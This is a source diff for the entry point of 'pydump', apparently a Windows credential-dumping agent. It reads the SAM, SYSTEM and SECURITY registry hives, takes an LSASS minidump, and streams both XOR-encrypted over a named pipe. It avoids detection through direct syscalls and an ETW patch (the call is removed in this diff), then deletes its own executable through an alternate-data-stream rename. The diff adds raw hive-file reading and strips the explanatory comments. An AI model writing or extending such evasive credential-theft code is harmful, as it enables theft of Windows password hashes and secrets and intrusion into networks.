@@ -1,6 +1,10 @@
 /**
  * pydump agent — entry point. Zero kernel32/advapi32 dependencies.
- * Command line and image path from PEB, exit via NtTerminateProcess.
+ * Command line: agent.exe <MODE> <PID> <OUTPUT_NAME>
+ *   mode & 4 = hive file reads (NtCreateFile + NtReadFile)
+ *   mode & 2 = LSASS minidump
+ *   mode & 1 = structured registry API reads (legacy)
+ * Protocol: "PYD\x03" + registry section + LSASS MDMP.
  */
 
 #include <windows.h>
@@ -25,8 +29,6 @@ static void self_delete(void) {
     PUNICODE_STRING img_path = get_image_path();
     if (!img_path || !img_path->Buffer || !img_path->Length) return;
 
-    /* Build NT path: \??\<image_path> */
-    /* PEB ImagePathName is typically a DOS path like C:\..., need \??\ prefix */
     wchar_t nt_path[520];
     nt_path[0] = L'\\';
     nt_path[1] = L'?';
@@ -52,7 +54,6 @@ static void self_delete(void) {
     IO_STATUS_BLOCK iosb;
     HANDLE hFile = NULL;
 
-    /* Step 1: Open own file with DELETE|SYNCHRONIZE */
     NTSTATUS status = sys_NtCreateFile(
         &hFile,
         0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
@@ -64,7 +65,6 @@ static void self_delete(void) {
     );
     if (!NT_SUCCESS(status)) return;
 
-    /* Step 2: Rename to ":x" ADS (FileRenameInformation = 10) */
     struct {
         BOOLEAN ReplaceIfExists;
         BYTE    pad[7];
@@ -77,7 +77,7 @@ static void self_delete(void) {
     rename_info.pad[3] = 0; rename_info.pad[4] = 0; rename_info.pad[5] = 0;
     rename_info.pad[6] = 0;
     rename_info.RootDirectory = NULL;
-    rename_info.FileNameLength = 4; /* 2 wchars = 4 bytes */
+    rename_info.FileNameLength = 4;
     rename_info.FileName[0] = L':';
     rename_info.FileName[1] = L'x';
 
@@ -86,7 +86,6 @@ static void self_delete(void) {
     sys_NtClose(hFile);
     if (!NT_SUCCESS(status)) return;
 
-    /* Step 3: Open again and mark for deletion (FileDispositionInformation = 13) */
     status = sys_NtCreateFile(
         &hFile,
         0x00010000 | 0x00100000, /* DELETE | SYNCHRONIZE */
@@ -107,7 +106,6 @@ static void self_delete(void) {
 /* ── Entry point ─────────────────────────────────────────── */
 
 void main_entry(void) {
-    /* Parse command line from PEB: "agent.exe <MODE> <PID> <PIPE_NAME>" */
     PUNICODE_STRING cmdline_us = get_command_line();
     if (!cmdline_us || !cmdline_us->Buffer) {
         sys_NtTerminateProcess((HANDLE)-1, 1);
@@ -136,58 +134,53 @@ void main_entry(void) {
     while (*p && *p != L' ') p++;
     while (*p == L' ') p++;
 
-    /* Remaining is pipe name */
-    wchar_t *pipe_name = p;
-    wchar_t *end = pipe_name;
+    /* Output name */
+    wchar_t *out_name = p;
+    wchar_t *end = out_name;
     while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
     *end = L'\0';
 
-    if (mode == 0 || pipe_name[0] == L'\0') {
+    if (mode == 0 || out_name[0] == L'\0') {
         sys_NtTerminateProcess((HANDLE)-1, 1);
         return;
     }
 
-    /* Step 1: Resolve syscalls */
     if (!resolve_syscalls()) {
         sys_NtTerminateProcess((HANDLE)-1, 2);
         return;
     }
 
-    /* Step 2: Patch ETW */
-    patch_etw();
-
-    /* Step 3: Create named pipe */
-    HANDLE pipe = open_named_pipe(pipe_name);
+    HANDLE pipe = open_named_pipe(out_name);
     if (!pipe) {
         sys_NtTerminateProcess((HANDLE)-1, 3);
         return;
     }
 
-    /* Step 3.5: Initialize XOR cipher with pipe name as key */
-    init_pipe_cipher(pipe_name);
+    init_pipe_cipher(out_name);
 
-    /* Step 4: Protocol header */
-    BYTE magic[4] = {'P', 'Y', 'D', 0x01};
+    BYTE magic[4] = {'P', 'Y', 'D', 0x03};
     write_pipe(pipe, magic, 4);
 
-    /* Step 5: Registry hives (if mode & 1) */
-    if (mode & 1) {
+    /* Registry: hive file reads (mode 4) or structured API reads (mode 1) */
+    if (mode & 4) {
+        init_registry();
+        dump_hive_files(pipe);
+    } else if (mode & 1) {
         init_registry();
         dump_registry_hives(pipe);
     } else {
         DWORD zero = 0;
-        write_pipe(pipe, &zero, 4);
-        write_pipe(pipe, &zero, 4);
-        write_pipe(pipe, &zero, 4);
+        write_pipe(pipe, &zero, 4); /* system_len = 0 */
+        write_pipe(pipe, &zero, 4); /* sam_len = 0 */
+        write_pipe(pipe, &zero, 4); /* security_len = 0 */
     }
 
-    /* Step 6: LSASS dump (if mode & 2) */
+    /* LSASS minidump */
     BOOL success = TRUE;
-    if ((mode & 2) && pid > 0) {
+    if (mode & 2) {
         success = dump_lsass(pid, pipe);
     }
 
-    /* Step 7: Cleanup */
     close_pipe(pipe);
     self_delete();
 
